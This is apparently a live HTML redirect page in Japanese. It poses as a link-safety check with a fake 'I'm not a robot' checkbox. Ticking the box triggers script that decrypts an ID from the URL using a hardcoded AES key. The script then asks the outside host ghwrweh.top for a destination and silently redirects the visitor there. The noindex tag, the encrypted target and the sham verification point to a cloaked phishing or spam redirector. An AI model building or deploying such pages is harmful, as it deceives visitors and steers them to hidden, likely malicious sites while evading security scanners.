<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <title>セキュリティ確認中...</title>
  <meta name="robots" content="noindex,nofollow">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { text-align:center; font-family:sans-serif; padding-top:80px; background:#f9f9f9; }
    .loader { margin:30px auto; border:6px solid #f3f3f3; border-top:6px solid #3498db;
              border-radius:50%; width:50px; height:50px; animation:spin 1s infinite; display: none; }
    @keyframes spin { to { transform: rotate(360deg); } }
    .caption { color:#666; font-size:13px; margin-top:10px; }
    .verify-box { margin-top: 30px; }
    .error { color: red; margin-top: 10px; }
    label { cursor: pointer; }
  </style>
</head>
<body>
  <h2>セキュリティ確認中...</h2>
  <p>リンクの安全性を確認しています。下のボックスをチェックしてください。</p>

  <div class="verify-box">
    <input type="checkbox" id="verify">
    <label for="verify">私はロボットではありません</label>
  </div>

  <div class="loader" id="loader"></div>
  <p class="caption">セキュア認証サービス</p>
  <p class="error" id="errorMsg"></p>

  <script>
    const AES_KEY = "5Ctianyoumabiiii"; // 与后端一致
    const path = location.pathname.split("/").filter(Boolean);
    const encryptedId = path[path.length - 1];

    const checkbox = document.getElementById("verify");
    const loader = document.getElementById("loader");
    const errorMsg = document.getElementById("errorMsg");

    checkbox.addEventListener("change", async () => {
      if (!checkbox.checked) return;

      loader.style.display = "block";
      errorMsg.innerText = "";

      if (!encryptedId) {
        errorMsg.innerText = "ID が見つかりません。";
        loader.style.display = "none";
        return;
      }

      const realId = await decryptAES(encryptedId);
      if (!realId) {
        errorMsg.innerText = "ID復号に失敗しました。";
        loader.style.display = "none";
        return;
      }

      try {
        const res = await fetch("https://ghwrweh.top/api/jumpSite?siteName=" + encodeURIComponent(realId));
        const json = await res.json();
        const final = json?.data?.siteUrl;
        if (!final) {
          errorMsg.innerText = "リダイレクト先が見つかりません。";
          loader.style.display = "none";
        } else {
          setTimeout(() => {
            location.href = final;
          }, 1500);
        }
      } catch {
        errorMsg.innerText = "APIエラーが発生しました。";
        loader.style.display = "none";
      }
    });

    async function decryptAES(encText) {
      try {
        const b64 = encText.replace(/-/g,'+').replace(/_/g,'/');
        const bytes = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
        const iv = bytes.slice(0,16), data = bytes.slice(16);
        const key = await crypto.subtle.importKey("raw",
          new TextEncoder().encode(AES_KEY), {name:"AES-CBC"}, false, ["decrypt"]);
        const dec = await crypto.subtle.decrypt({name:"AES-CBC", iv}, key, data);
        return new TextDecoder().decode(dec).replace(/\u0000+$/, "");
      } catch {
        return null;
      }
    }
  </script>
</body>
</html>
